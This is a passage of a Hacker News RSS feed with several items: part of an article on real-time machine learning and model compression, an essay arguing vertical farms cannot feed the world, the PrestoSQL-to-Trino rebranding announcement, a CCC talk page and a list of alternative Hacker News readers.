<h2 id="online_predictions">Level 1: Online predictions - your system can make predictions in real-time</h2>
<p><em><b>Real-time</b> here is defined to be in the order of milliseconds to seconds.</em></p>

<h3 id="online_predictions_use_cases">Use cases</h3>
<p>Latency matters, especially for user-facing applications. In 2009, Google’s experiments demonstrated that <a href="https://services.google.com/fh/files/blogs/google_delayexp.pdf">increasing web search latency 100 to 400 ms reduces the daily number of searches per user by 0.2% to 0.6%</a>. In 2019, <a href="https://blog.acolyer.org/2019/10/07/150-successful-machine-learning-models/">Booking.com found that an increase of 30% in latency cost about 0.5% in conversion rates — “a relevant cost for our business.”</a></p>

<p>No matter how great your ML models are, if they take just milliseconds too long to make predictions, users are going to click on something else.</p>

<h4 id="problems_batch_predictions">Problems with batch predictions</h4>
<p>One non-solution is to avoid making predictions online. You can generate predictions in batch offline, store them (e.g. in SQL tables), and pull out pre-computed predictions when needed.</p>

<p>This can work when the input space is finite – you know exactly how many possible inputs to make predictions for. One example is when you need to generate movie recommendations for your users – you know exactly how many users there are. So you predict a set of recommendations for each user periodically, such as every few hours.</p>

<p>To make their user input space finite, many apps make their users choose from categories instead of entering wild queries. For example, if you go to TripAdvisor, you first have to pick a predefined metropolis area instead of being able to enter just any location.</p>

<p>This approach has many limitations. TripAdvisor results are okay within their predefined categories, such as <b>“Restaurants”</b> in <b>“San Francisco”</b>, but are pretty bad when you try to enter wild queries like <b>“high rating Thai restaurants in Hayes Valley”</b>.</p>

<center>
<figure>
<img alt="MLOps over time" src="https://huyenchip.com/assets/pics/real-time-ml/1_tripadvisor.png">
</figure>
</center>

<p>Limitations caused by batch predictions exist even in more technologically progressive companies like Netflix. Say, you’ve been watching a lot of horrors lately, so when you first log into Netflix, horror movies dominate recommendations. But you’re feeling bright today so you search “comedy” and start browsing the comedy category. Netflix should learn and show you more comedy in your list of their recommendations, right? But it can’t update the list until the next time batch recommendations are generated.</p>

<p>In the two examples above, batch predictions lead to decreases in user experience (which is tightly coupled with user engagement/retention), not catastrophic failures. Other examples are ad ranking, Twitter’s trending hashtag ranking, Facebook’s newsfeed ranking, estimating time of arrival, etc.</p>

<p>There are also many applications that, without online predictions, would lead to catastrophic failures or just wouldn’t work. Examples include high frequency trading, autonomous vehicles, voice assistants, unlocking your phones using face/fingerprints, fall detection for elderly care, fraud detection, etc. Being able to detect a fraudulent transaction that happened 3 hours ago is still better than not detecting it at all, but being able to detect it in real-time can prevent it from going through.</p>

<p>Switching from batch predictions to real-time predictions allows you to use dynamic features to make more relevant predictions. Static features are information that changes slowly or rarely – age, gender, job, neighborhood, etc. Dynamic features are features based on what’s happening right now – what you’re watching, what you’ve just liked, etc. Knowing a user’s interests right now will allow your systems to make recommendations much more relevant to them.</p>

<center>
<figure>
<img alt="MLOps over time" src="https://huyenchip.com/assets/pics/real-time-ml/2_google.png">
</figure>
</center>

<h3 id="online_predictions_solutions">Solutions</h3>
<p>For your system to be able to make online predictions, it has to have two components:</p>

<ol>
  <li>Fast inference: model that can make predictions in the order of milliseconds</li>
  <li>Real-time pipeline: a pipeline that can process data, input it into model, and return a prediction in real-time</li>
</ol>

<h4 id="fast_inference">Fast inference</h4>
<p>When a model is too big and taking too long to make predictions, there are three approaches:</p>

<p><b>1. Make models faster (inference optimization)</b></p>

<p>E.g. fusing operations, distributing computations, memory footprint optimization, writing high performance kernels targeting specific hardwares, etc.</p>

<p><b>2. Make models smaller (model compression)</b></p>

<p>Originally, this family of technique is to make models smaller to make them fit on edge devices. Making models smaller often makes them run faster. The most common, general technique for model compression is quantization, e.g. using 16-bit floats (half precision) or 8-bit integers (fixed-point) instead of 32-bit floats (full precision) to represent your model weights. In the extreme case, some have attempted 1-bit representation (binary weight neural networks), e.g. <a href="https://arxiv.org/abs/1511.00363">BinaryConnect</a> and <a href="https://arxiv.org/abs/1603.05279">Xnor-Net</a>. The authors of Xnor-Net spun off Xnor.ai, a startup focused on model compression which was <a href="https://www.geekwire.com/2020/exclusive-apple-acquires-xnor-ai-edge-ai-spin-paul-allens-ai2-price-200m-range/">acquired by Apple for a reported $200M</a>.</p>

<p>Another popular technique is <a href="https://arxiv.org/abs/1503.02531">knowledge distillation</a> – a small model (student) is trained to mimic a larger model or an ensemble of models (teacher). Even though the student is often trained with a pre-trained teacher, both may also be trained at the same time. One example of a distilled network used in production is <a href="https://arxiv.org/abs/1910.01108"><strong>DistilBERT</strong></a>, which reduces the size of a BERT model by 40%, while retaining 97% of its language understanding capabilities and being 60% faster.</p>

<p>Other techniques include pruning (finding parameters least useful to predictions and setting them to 0) and low-rank factorization (replacing the over-parametric convolution filters with compact blocks to both reduce the number of parameters and increase speed). See <strong><a href="https://arxiv.org/abs/1710.09282">A Survey of Model Compression and Acceleration for Deep Neural Networks</a></strong> (Cheng et al.. 2017) for a detailed analysis.</p>

<p>The number of research papers on model compression is growing. Off-the-shelf utilities are proliferating. Awesome Open Source has a list of <a href="https://awesomeopensource.com/projects/model-compression"><strong>The Top 40 Model Compression Open Source Projects</strong></a>.</p>

<p><b>3. Make hardware faster</b></p>

<p>This is another research area that is booming. Big companies and startups alike are in a race to develop hardware that allows large ML models to do inference, even training, faster both on the cloud and especially on devices. IDC forecasts that by 2020, the combination of edge and mobile devices doing inferencing will <a href="https://www.arm.com/-/media/global/solutions/artificial-intelligence/ai-ml-on-cpu-whitepaper.pdf?revision=17a2b30b-0f5a-4a42-8681-3d9f3f94e513">total 3.7 billion units, with a further 116 million units doing training</a>.</p>

<h4 id="stream_pipeline">Real-time pipeline</h4>
<p>Suppose you have a ride sharing app and want to detect fraudulent transactions e.g. payments using stolen credit cards. When the true credit owner discovers unauthorized payments, they’ll dispute with their bank and you’ll have to refund the charges. To maximize profits, fraudsters might call multiple rides either in succession or from multiple accounts. In 2019, merchants estimate fraudulent transactions account for an average of <a href="https://network.americanexpress.com/globalnetwork/dam/jcr:09c34553-b4a2-43ca-bf3e-47cbc911ea51/American%20Express%202019%20Digital%20Payments%20Survey_Insights%20Paper.pdf">27% of their annual online sales</a>. The longer it takes for you to detect the stolen credit card, the more money you’ll lose.</p>

<p>To detect whether a transaction is fraudulent, looking at that transaction alone isn’t enough. You need to at least look into the recent history of the user involved in that transaction, their recent trips and activities in-app, the credit card’s recent transactions, and other transactions happening around the same time.</p>

<p>To quickly access these types of information, you want to keep as much of them in-memory as possible. Every time an event you care about happens – a user choosing a location, booking a trip, contacting a driver, canceling a trip, adding a credit card, removing a credit card, etc. – information about that event goes into your in-memory storage. It stays there for as long as they are useful (usually in order of days) then either goes into permanent storage (e.g. S3) or is discarded. The most common tool for this is <a href="https://github.com/apache/kafka">Apache Kafka</a>, with alternatives such as Amazon Kinesis. Kafka is a stream storage: it stores data as it streams.</p>

<p>Streaming data is different from static data – data that already exists somewhere in its entirety, such as CSV files. When reading from CSV files, you know when the job is finished. Streams of data never finish.</p>

<p>Once you’ve had a way to manage streaming data, you want to extract features to input into your ML models. On top of features from streaming data, you might also need features from static data (when was this account created, what’s the user’s rating, etc.). You need a tool that allows you to process streaming data as well as static data and join …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://huyenchip.com/2020/12/27/real-time-machine-learning.html">https://huyenchip.com/2020/12/27/real-time-machine-learning.html</a></em></p>]]>
            </description>
            <link>https://huyenchip.com/2020/12/27/real-time-machine-learning.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557412</guid>
            <pubDate>Mon, 28 Dec 2020 07:21:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No, Vertical Farms Won’t Feed the World]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557407">thread link</a>) | @hannob
<br/>
December 27, 2020 | https://globalecoguy.org/no-vertical-farms-wont-feed-the-world-5313e3e961c0 | <a href="https://web.archive.org/web/*/https://globalecoguy.org/no-vertical-farms-wont-feed-the-world-5313e3e961c0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><figure><div role="button" tabindex="0"><div><p><img alt="Image for post" src="https://miro.medium.com/max/8574/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg" width="4287" height="1673" srcset="https://miro.medium.com/max/552/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 276w, https://miro.medium.com/max/1104/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 552w, https://miro.medium.com/max/1280/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 640w, https://miro.medium.com/max/1456/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 728w, https://miro.medium.com/max/1632/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 816w, https://miro.medium.com/max/1808/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 904w, https://miro.medium.com/max/1984/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 992w, https://miro.medium.com/max/2160/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 1080w, https://miro.medium.com/max/2700/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 1350w, https://miro.medium.com/max/3240/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 1620w, https://miro.medium.com/max/3780/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 1890w, https://miro.medium.com/max/4320/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 2160w, https://miro.medium.com/max/4800/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*LxTo93oCvOVo9Q-YCrcBpg.jpeg?q=20"></p></div></div><figcaption>Lettuce grown in my garden. Photograph © 2016 Jonathan Foley.</figcaption></figure></div><div><div><h2 id="f47c">While they are well-intentioned, new indoor “farms” won’t help feed the world or reduce the environmental impacts of agriculture. We would be better to focus our efforts elsewhere.</h2><div><div><div><div><a href="https://globalecoguy.medium.com/?source=post_page-----5313e3e961c0--------------------------------" rel="noopener"><div><p><img alt="Jonathan Foley" src="https://miro.medium.com/fit/c/96/96/1*9wBAcVM1jqF9OWCjCOGiuA.jpeg" width="48" height="48"></p></div></a></div></div></div></div></div></div></section><section><div><div><p id="bd54"><span>W</span>e’re beginning to see a new fad in agriculture — so-called “vertical farms” that grow food <em>indoors </em>with energy-intensive, artificial life support systems.</p><p id="498f">In the last few years, a number of tech companies have designed “farms” that utilize artificial lights, heaters, water pumps, and computer controls to grow crops inside. These systems glow with a fantastic magenta light — from LEDs that are specially tuned to provide optimal light for photosynthesis — often with stacked trays of plants, one on top of the other. Some of this technology is new, especially the LEDs, although pot growers have used tools like this for years.</p><p id="db29">Some of the more notable efforts to build indoor “farms” include <a href="http://www.freightfarms.com/" rel="noopener">Freight Farms</a> in Boston. And there is a group at MIT that is trying to create new high-tech platforms for growing food inside, including “<a href="http://openag.media.mit.edu/hardware/" rel="noopener">food computers</a>”. These folks are very smart, and have done a lot to perfect the technology.</p><p id="47bb">At first blush, these “farms” sound great. Why not <em>completely</em> eliminate food miles, and grow food right next to restaurants, cafeterias, or supermarkets? And why not grow crops inside closed systems, where water can be recycled, and pests can (in theory) be managed without chemicals.</p><p id="d5c4">It sounds great, doesn’t it? But there are many challenges.</p></div></div></section><section><div><div><p id="6ba8"><span>F</span><strong>irst, Vertical Farms Cost a Fortune</strong></p><p id="5f2b">But there are costs to these farms. <em>Huge</em> costs.</p><p id="f0bc">First, these systems are <em>really</em> expensive to build. The shipping container systems developed by <a href="http://www.freightfarms.com/faq/" rel="noopener">Freight Farms</a>, for example, cost between $82,000 and $85,000 <em>per container</em> — an astonishing sum for a box that just grows greens and herbs. Just one container costs as much as 10 entire acres of prime American farmland — which is a far better investment, both in terms of food production and future economic value. Just remember: farmland has the benefit of generally <em>appreciating</em> in <a href="http://www.forbes.com/sites/joshuarogers/2014/09/23/dirt-cheap-investors-are-plowing-into-farmland-heres-why" rel="noopener">value over time</a>, whereas a big metal box is likely to only decrease in value.</p><p id="24cf">Second, food produced this way is <em>very</em> expensive. For example, the Wall Street Journal <a href="http://www.wsj.com/articles/are-shipping-containers-the-future-of-farming-1465393797" rel="noopener">reports</a> that mini-lettuces grown by Green Line Growers costs more than <em>twice</em> as much as organic lettuce available in most stores. And this is typical for other indoor growers around the country: it’s very, very expensive, even compared to organic food. Instead of making food <em>more</em>available, especially to poorer families on limited budgets, these indoor crops are only available to the affluent. It might be fine for gourmet lettuce, or fancy greens for expensive restaurants, but regular folks may find it out of reach.</p><p id="e121">Finally, indoor farms use <em>a lot</em> of energy and materials to operate. The container farms from Freight Farms, for example, use about <a href="http://www.freightfarms.com/faq/" rel="noopener">80 kilowatt-hours of electricity a day</a> to power the lights and pumps. That’s nearly 2–3 times as much electricity as a typical (and still very inefficient) American home, or about 8 times the electricity used by an average San Francisco apartment. And on the average American electrical grid, this translates to emitting <em>44,000 pounds of CO2 per container per year</em>, from electricity alone, not counting any additional heating costs. This is <em>vastly</em> more than the emissions it would take to ship the food from someplace else.</p><p id="0e49">And none of it is necessary.</p></div></div></section><section><div><div><p id="1017"><span>B</span><strong>ut, Wait, Can’t Indoor Farms Use Renewable Energy?</strong></p><p id="5bbd">Proponents of indoor techno-farms often say that they can offset the enormous sums of electricity they use, by powering them with renewable energy — especially solar panels — to make the whole thing carbon neutral.</p><p id="5b5d">But just stop and think about this for a second.</p><p id="5f6a">These indoor “farms” would use solar panels to harvest naturally occurring sunlight, and convert it into electricity, so that they can power…<em>artificial sunlight</em>? In other words<em>, </em>they’re<em> trying to use the sun to replace the sun.</em></p><p id="0a0f">But we don’t need to replace the sun. Of all of the things we should worry about in agriculture, the availability of free sunlight is not one of them. Any system that seeks to replace the sun to grow food is probably a bad idea.</p></div></div></section><section><div><div><p id="e3d3"><span>B</span><strong>esides, “Food Miles” Aren’t a Big Climate Problem</strong></p><p id="29a5">Sometimes we hear that vertical farms help the environment by reducing “food miles” — the distance food items travel from farm to table — and thereby reduce fuel consumption and greenhouse gas emissions.</p><p id="0f7a">This sounds logical, but it turns out to be a red herring.</p><p id="c2ec">Strange as it might seem, local food typically uses about the same amount of energy — per pound — to transport as food grown far away. Why? Short answer: volume and method of transport. A larger food operator can ship food more efficiently — even if it travels longer distances — because of the gigantic volumes they work in. Plus, ships, trains, and even large trucks driving on Interstate highways use less fuel, per pound per mile, than small trucks driving around town.</p><p id="a654">Plus it turns out that “food miles” aren’t a very big source of CO2 emissions anyway, whether they’re local or not. In fact, they pale in comparison to emissions from deforestation, methane from cattle and rice fields, and nitrous oxide from over-fertilized fields. And local food systems — especially organic farms that use fewer fertilizers, and grass fed beef that sequesters carbon in the soil — can reduce these more critical emissions. At the end of the day, local food systems are generally better for the environment, including greenhouse gas emissions. Just don’t worry about emissions from food miles too much.</p></div></div></section><section><div><div><p id="6153"><span>A</span><strong>nd These Vertical “Farms” Can’t Grow Much</strong></p><p id="1ac1">A further problem with indoor farms is that a lot of crops could never develop properly in these artificial conditions. While LED lights provide the light needed for <em>photosynthesis</em> to occur, they don’t provide the proper mix of light and heat to trigger plant development stages — like those that tell plants when to put on fruit or seed. Moreover, a lot of crops need a bit of wind to develop tall, strong stalks, needed later when they are carrying heavy loads before harvest. As a result, indoor farms are severely limited, and have a hard time growing things besides simple greens.</p><p id="71b1">Indoor farms might be able to provide some <em>garnish</em> and <em>salads</em> to the world, but forget about them as a means of growing much other <em>food</em>.</p></div></div></section><section><div><div><p id="003c"><strong>A Better Way?</strong></p><p id="bf8f">I’m not the only critic of indoor, high-tech, energy-intensive agriculture. Other authors are starting to point out the problems with these systems too (read very good critiques <a href="http://www.salon.com/2016/02/17/enough_with_the_vertical_farming_partner/" rel="noopener">here</a>, <a href="http://www.counterpunch.org/2012/12/11/the-vertical-farming-scam/" rel="noopener">here</a>, <a href="https://www.theguardian.com/sustainable-business/2015/apr/10/indoor-farming-makes-no-economic-environmental-sense" rel="noopener">here</a>, and <a href="http://news.cornell.edu/stories/2014/02/indoor-urban-farms-called-wasteful-pie-sky" rel="noopener">here</a>).</p><p id="02f4">While I appreciate the enthusiasm and innovation put into developing indoor farms, I think these efforts are, at the end of the day, counterproductive.</p><p id="8dea">Instead, I think we should use the same investment of dollars, incredible technology, and amazing brains to solve other agricultural problems — like developing new methods for drip irrigation, better grazing systems that lock up soil carbon, and ways of recycling on-farm nutrients. Organic farming and high-precision agriculture are doing promising things, and need more help. We also need innovation and capital to help other parts of the food system, especially in tackling food waste, and getting people to shift their diets towards more sustainable directions.</p><p id="9534">An interconnected network of good farms —real farms that provide nutritious food, with social and environmental benefits to their communities — is the kind of innovation we really need.</p></div></div></section><section><div><p id="b135">NOTE: parts of this piece were adapted from an earlier blog article of mine called <em>“Local Food is Great, But Can It Go Too Far?”</em></p></div></section><section><div><div><p id="68aa"><em>Dr. </em><a href="http://globalecoguy.org/" rel="noopener"><em>Jonathan Foley</em></a><em> (@</em><a href="http://twitter.com/@globalecoguy" rel="noopener"><em>GlobalEcoGuy</em></a><em>) is a climate &amp; environmental scientist, writer, and speaker. He is also the Executive Director of </em><a href="http://drawdown.org/" rel="noopener"><em>Project Drawdown</em></a><em>, the world’s leading resource for climate solutions.</em></p><p id="10de"><em>These views are his own.</em></p><p id="db28">Copyright © 2015–2020, Jonathan Foley. All rights reserved.</p></div></div></section></div></div>]]>
            </description>
            <link>https://globalecoguy.org/no-vertical-farms-wont-feed-the-world-5313e3e961c0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557407</guid>
            <pubDate>Mon, 28 Dec 2020 07:20:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Flurly now supports redirect URLs]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557325">thread link</a>) | @flurly
<br/>
December 27, 2020 | https://flurly.com/blog/redirect | <a href="https://web.archive.org/web/*/https://flurly.com/blog/redirect">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This means, when a customer makes a purchase, instead of taking them to a Flurly download page, you can automatically redirect them to your website for product fufillment. Take a look and give it a try in your settings page <a href="https://flurly.com/dashboard/settings">https://flurly.com/dashboard/settings</a></p>
<p><img src="https://flurly.com/images/redirect.png" alt="Image of Redirect URL"></p>
</div></div>]]>
            </description>
            <link>https://flurly.com/blog/redirect</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557325</guid>
            <pubDate>Mon, 28 Dec 2020 06:57:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We’re Rebranding PrestoSQL as Trino]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557321">thread link</a>) | @addisonj
<br/>
December 27, 2020 | https://trino.io/blog/2020/12/27/announcing-trino.html | <a href="https://web.archive.org/web/*/https://trino.io/blog/2020/12/27/announcing-trino.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>We’re rebranding PrestoSQL as Trino. The software and the community you have come to love and depend on aren’t 
going anywhere, we are simply renaming. <strong>Trino is the new name for PrestoSQL</strong>, the project supported by the founders 
and creators of Presto® along with the major contributors – just under a shiny new name. And now you can find us here:</p>

<ul>
  <li>GitHub: <a href="https://github.com/trinodb/trino">https://github.com/trinodb/trino</a>. Please give it a <a href="https://github.com/trinodb/trino/blob/master/.github/star.png">star</a>!</li>
  <li>Twitter: <a href="https://twitter.com/trinodb">@trinodb</a></li>
  <li>Slack: <a href="https://trino.io/slack.html">https://trino.io/slack.html</a></li>
</ul>

<p>If you want to learn why we’re doing this, read on…</p>

<!--more-->

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto® to address the problems of low latency interactive analytics over Facebook’s massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto® to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto® community. Presto® was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto®. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto® community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto® continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don’t take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation®. As a first 
action, Facebook applied for a trademark on Presto®. This was a surprising, norm-breaking move because up until that point, 
the Presto® name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation®, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

<p>On a personal note, and as the founders who named the project Presto® in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto®, we have come to accept that a 
name is just a name. To be frank, we’re tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing – building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We’re not going anywhere – we’re the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ❤️</strong></p>


<p>Facebook is a registered trademark of Facebook Inc.  The Linux Foundation and Presto are trademarks of The Linux Foundation.</p>


  </div>

  
</article>

</div></div>]]>
            </description>
            <link>https://trino.io/blog/2020/12/27/announcing-trino.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557321</guid>
            <pubDate>Mon, 28 Dec 2020 06:55:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What the cyberoptimists got wrong – and what to do about it]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557229">thread link</a>) | @pdkl95
<br/>
December 27, 2020 | https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=doctorow">doctorow</a>

</p>

<p><a href="https://media.ccc.de/c/rc3/rC3" rel="tag">rC3</a>
<a href="https://media.ccc.de/c/rc3/Ethics,%20Society%20&amp;%20Politics" rel="tag">Ethics, Society &amp; Politics</a>
Playlists:
<a href="https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it/playlist">'rc3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it/audio">audio</a></p>
<!-- %h3 About -->
<p>They stole our future. Let's take it back.</p>

<p>Here at the end of the world, it's time to take stock. Is technology a force for good? Can it be? Was it ever? How did we end up with a world made up of "five websites, each filled with screenshots of text from the other four" (h/t Tom Eastman)? Should we worry that machine learning will take away our free will through A/B splitting and Big Five Personality Types? Where the fuck did all these Nazis come from? </p>

<h3>Download</h3>
<div>
<div>

<div>

<div>
<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
</div>
</div>


</div>

</div>
<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557229</guid>
            <pubDate>Mon, 28 Dec 2020 06:33:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HN Alternative UIs]]>
            </title>
            <description>
<![CDATA[
Score 150 | Comments 106 (<a href="https://news.ycombinator.com/item?id=25556990">thread link</a>) | @lgats
<br/>
December 27, 2020 | https://blog.luke.lol/tech/hacker-news-alternatives/ | <a href="https://web.archive.org/web/*/https://blog.luke.lol/tech/hacker-news-alternatives/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<h2>News.YCombinator.com Readers</h2>
<p>Ranked by Alexa popularity.</p>
<p><a href="https://hn.algolia.com/">hn.algolia.com</a><br>
HackerNews with a search function and 16.8+ million posts indexed.<br>
Alexa: 8.7k</p>
<p><a href="http://popurls.com/">popurls.com</a><br>
Several news sites combined into a single newspaper-like feed<br>
Alexa: 87k</p>
<p><a href="https://upstract.com/">upstract.com</a><br>
News aggregator with paid features, includes HN<br>
Alexa: 137k</p>
<p><a href="https://hckrnews.com/">hckrnews.com</a><br>
HN posts organized by rolling, quarter-daily timeslots.<br>
Alexa: 178k</p>
<p><a href="https://pxlet.com/">pxlet.com</a><br>
Culmination of HN, Reddit, SlashDot, and other Tech-News Sites<br>
Alexa: 330k</p>
<p><a href="https://hackernewsletter.com/">hackernewsletter.com</a><br>
HN delivered via email<br>
Alexa: 581k</p>
<p><a href="https://old.thenews.im/">thenews.im&nbsp;</a><br>
Designer News, Product Hunt and Hacker News Mashup with easy-access to individual feeds<br>
Alexa: 960k</p>
<p><a href="http://www.daemonology.net/hn-daily/">daemonology.net</a><br>
Daily list of the top HN posts.<br>
Alexa: 971k</p>
<p><a href="http://n-gate.com/%3En-gate.com%3C/a%3E%3Cbr%20/%3EA%20weekly%20[human?]%20annotated%20digest%20of%20the%20top%20%E2%80%9CHacker%E2%80%9D%20%E2%80%9CNews%E2%80%9D%20posts%3Cbr%20/%3EAlexa:%202.5m%3C/p%3E%3Cp%3E%3Ca%20href=" https:="" hn.premii.com"="">hn.premii.com</a><br>
HN Mirror integrated with an on-page reader<br>
Alexa: 3m</p>
<p><a href="http://hnrankings.info/">hnrankings.info</a><br>
HN Ranking Charts<br>
Alexa: 4m</p>
<p><a href="https://hnews.xyz/">hnews.xyz</a><br>
HN Mirror with Webpage Screenshots [similar to tiledhn.com (<a href="https://web.archive.org/web/20200120125632/http://www.tiledhn.com/">RIP</a>)]<br>
Alexa: 5m</p>
<p><a href="https://hnsince.com/">hnsince.com</a><br>
Top HN posts since you last visited<br>
Alexa: 5.4m</p>
<p><a href="https://hackerweb.app/">hackerweb.app</a><br>
More mobile-friendly HN<br>
Alexa: 6.3m</p>
<p><a href="https://fullhn.com/">fullhn.com</a><br>
Front page of HN in a single page loaded with all articles. Great for loading up before you jump on a flight without wireless access.<br>
Alexa: 7m</p>
<p><a href="https://hackurls.com/">hackurls.com</a><br>
HN, proggit, reddit, toptal, hackaday, slashdot, techmeme, wired as separate feeds on a single page<br>
Alexa: 8.5m</p>
<p><a href="https://hackernewsmobile.com/">hackernewsmobile.com</a><br>
More mobile-friendly HN<br>
Alexa: 9.5m</p>
<p><a href="https://lopespm.github.io/hackernews-daily/">lopespm HN Daily</a><br>
HackerNews Daily – Culmination of top posts for the day<br>
Alexa: Unavailable</p>
<p><a href="https://www.wolfgangfaust.com/project/paper-hn/">wolfgangfaust HN Newspaper</a><br>
Newspaper themed HN<br>
Alexa: Unavailable</p>
<p><a href="https://thn.rakhim.org/">thn.rakhim.org</a><br>
30 random good HN posts from the past<br>
Alexa: Unavailable</p>
<p><a href="https://zvoid.org/hn">zvoid.org/hn</a><br>
Dark-themed HN reader<br>
Alexa: Unavailable</p>
<p><a href="https://hn.svelte.dev/">hn.svelte.dev</a><br>
mobile and dark mode friendly reader for HN<br>
Alexa: None</p>
<p><a href="https://hackernews.betacat.io/">hackernews.betacat.io</a><br>
Modern HN theme with website preview screenshots<br>
Alexa: None</p>
<p><a href="https://read.hn/">read.hn</a><br>
Another HN Reader view<br>
Alexa: None</p>
<p><a href="https://hnapp.com/">hnapp.com</a><br>
HN Advanced Search and monitoring tool<br>
Alexa: None</p>
<p><a href="http://hnpaper.forge.partlab.io/">hnpaper.forge.partlab.io</a><br>
HNPaper – bootstrap theme simple HN interface<br>
Alexa: Unavailable</p>
<p><a href="https://hack.ernews.info/">hack.ernews.info</a><br>
More mobile-friendly HN<br>
Alexa: None</p>
<p><a href="https://progscrape.com/">progscrape.com</a><br>
HN, Reddit, and Lobste.rs aggregated and merged into a single feed<br>
Alexa: None</p>
<p><a href="http://hn.elijames.org/">hn.elijames.org</a><br>
“Less annoying hacker news” with an even simpler interface<br>
Alexa: None</p>
<p><a href="http://serializer.io/">seralizer.io</a><br>
HN + Related Subreddits + Lobsters + Mac Rumors + Arstechnica<br>
Alexa: None</p>
<p><a href="https://nerdmash.com/">nerdmash.com</a><br>
A nerd’s daily read. Top posts from every nerdy content aggregator.<br>
Alexa: None</p>
<h2>Other Tweaks / Interfaces</h2>
